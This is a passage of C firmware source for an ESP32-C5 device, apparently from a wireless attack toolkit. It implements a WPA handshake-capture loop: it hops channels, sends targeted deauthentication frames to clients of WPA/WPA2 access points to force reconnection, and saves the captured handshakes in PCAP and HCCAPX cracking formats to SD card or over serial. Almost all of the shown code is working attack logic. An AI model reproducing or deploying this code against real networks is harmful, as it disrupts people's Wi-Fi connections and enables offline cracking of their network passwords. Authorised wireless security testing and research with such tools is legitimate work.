Smethan/projectZero/ESP32C5/main/main.c
        // Reset per-dwell counters
        hs_dwell_new_clients = 0;
        hs_dwell_eapol_frames = 0;
        
        // Dwell on this channel
        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));
        
        if (!handshake_attack_active || operation_stop_requested) break;
        
        // After dwell: process discovered clients for targeted deauth
        int64_t now = esp_timer_get_time();
        int deauth_count_this_dwell = 0;
        
        for (int i = 0; i < hs_client_count && handshake_attack_active; i++) {
            hs_client_entry_t *client = &hs_clients[i];
            if (client->hs_ap_index < 0 || client->hs_ap_index >= hs_ap_count) continue;
            
            hs_ap_target_t *ap = &hs_ap_targets[client->hs_ap_index];
            
            // Skip if AP already captured or has existing file
            if (ap->complete || ap->has_existing_file) continue;
            
            // Skip if AP is not on current channel
            if (ap->channel != channel) continue;
            
            // Skip if not WPA/WPA2
            if (ap->authmode == WIFI_AUTH_OPEN) continue;
            
            // Skip if client was recently deauthed (cooldown)
            if (client->last_deauth_us > 0 && 
                (now - client->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
            
            // Send targeted deauth to this client
            // Tab5 parses: strstr(">>> [") && strstr("Attacking") with SSID in quotes
            MY_LOG_INFO(TAG, ">>> Attacking '%s' (Ch %d) - deauth %02X:%02X:%02X:%02X:%02X:%02X <<<",
                       ap->ssid, ap->channel,
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            
            {
                char hss_l2[64], hss_l3[64];
                snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                snprintf(hss_l3, sizeof(hss_l3), "  Deauth %02X:%02X:%02X",
                         client->mac[3], client->mac[4], client->mac[5]);
                oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, "  Hunting...");
            }
            
            // Re-init HCCAPX serializer for this AP (so save works correctly)
            {
                size_t ssid_len = strlen(ap->ssid);
                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
            }
            
            hs_send_targeted_deauth(client->mac, ap->bssid, ap->channel);
            client->last_deauth_us = now;
            client->deauthed = true;
            ap->last_deauth_us = now;
            deauth_count_this_dwell++;
            
            // Limit deauths per dwell to avoid channel congestion
            if (deauth_count_this_dwell >= 3) break;
        }
        
        // If we deauthed someone, stay on this channel a bit longer to catch handshake
        if (deauth_count_this_dwell > 0) {
            vTaskDelay(pdMS_TO_TICKS(2000)); // 2s extra to catch reconnection
        }
        
        // Calculate D-UCB reward
        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
        ducb_update(ch_idx, reward);
        
        // Check for completed handshakes and save (SD or serial)
        for (int i = 0; i < hs_ap_count; i++) {
            hs_ap_target_t *ap = &hs_ap_targets[i];
            if (ap->complete && !ap->has_existing_file) {
                MY_LOG_INFO(TAG, "Saving complete handshake for '%s'...", ap->ssid);

                if (handshake_serial_mode) {
                    // Serial mode: dump PCAP/HCCAPX via serial as base64
                    // NOTE: dump BEFORE hccapx_serializer_init() which resets message_pair
                    unsigned pcap_size = 0;
                    uint8_t *pcap_buf = attack_handshake_get_pcap(&pcap_size);
                    if (pcap_buf && pcap_size > 0) {
                        dump_base64_serial("--- PCAP BEGIN ---", "--- PCAP END ---",
                                           pcap_buf, pcap_size);
                        printf("PCAP_SIZE: %u\n", pcap_size);
                    }
                    // Get HCCAPX before re-init (message_pair is still valid from capture)
                    hccapx_t *hccapx = (hccapx_t *)attack_handshake_get_hccapx();
                    if (hccapx) {
                        dump_base64_serial("--- HCCAPX BEGIN ---", "--- HCCAPX END ---",
                                           (const uint8_t *)hccapx, sizeof(hccapx_t));
                    }
                    // Print SSID/AP metadata from hs_ap_targets (always reliable)
                    printf("SSID: %s  AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
                           ap->ssid,
                           ap->bssid[0], ap->bssid[1], ap->bssid[2],
                           ap->bssid[3], ap->bssid[4], ap->bssid[5]);

                    ap->has_existing_file = true;
                    total_handshakes_captured++;
                    MY_LOG_INFO(TAG, "Handshake #%d sent via serial! (APs: %d, Clients: %d)",
                               total_handshakes_captured, hs_ap_count, hs_client_count);
                    {
                        char hss_l2[64], hss_l4[64];
                        snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                        snprintf(hss_l4, sizeof(hss_l4), "  >> Saved! #%d", total_handshakes_captured);
                        oled_display_update_full("> WPA Sniffer", hss_l2, "  Handshake OK!", hss_l4);
                    }

                    // Re-init serializers for next AP
                    pcap_serializer_init();
                    hccapx_serializer_init((const uint8_t *)"", 0);
                    for (int j = 0; j < hs_ap_count; j++) {
                        if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
                            hs_ap_targets[j].beacon_captured = false;
                        }
                    }
                } else {
                    // SD mode: re-init HCCAPX for this AP, then save to SD
                    size_t ssid_len = strlen(ap->ssid);
                    hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);

                    if (hs_save_handshake_to_sd(i)) {
                        ap->has_existing_file = true;
                        total_handshakes_captured++;
                        // Tab5 parses: strstr("Handshake #") && strstr("captured")
                        MY_LOG_INFO(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
                                   total_handshakes_captured, hs_ap_count, hs_client_count);

                        // Re-init PCAP after save to free memory and start fresh
                        pcap_serializer_init();
                        // Re-capture beacons for remaining APs
                        for (int j = 0; j < hs_ap_count; j++) {
                            if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
                                hs_ap_targets[j].beacon_captured = false; // Will be re-captured
                            }
                        }
                    } else {
                        // Tab5 parses: strstr("No handshake for")
                        MY_LOG_INFO(TAG, "No handshake for '%s' - save failed", ap->ssid);
                    }
                }
            }
        }
        
        // Periodic stats
        if ((now - last_stats_time) >= HS_STATS_INTERVAL_US) {
            int wpa_aps = 0, completed = 0, skipped = 0;
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
                if (hs_ap_targets[i].complete) completed++;
                if (hs_ap_targets[i].has_existing_file) skipped++;
            }
            
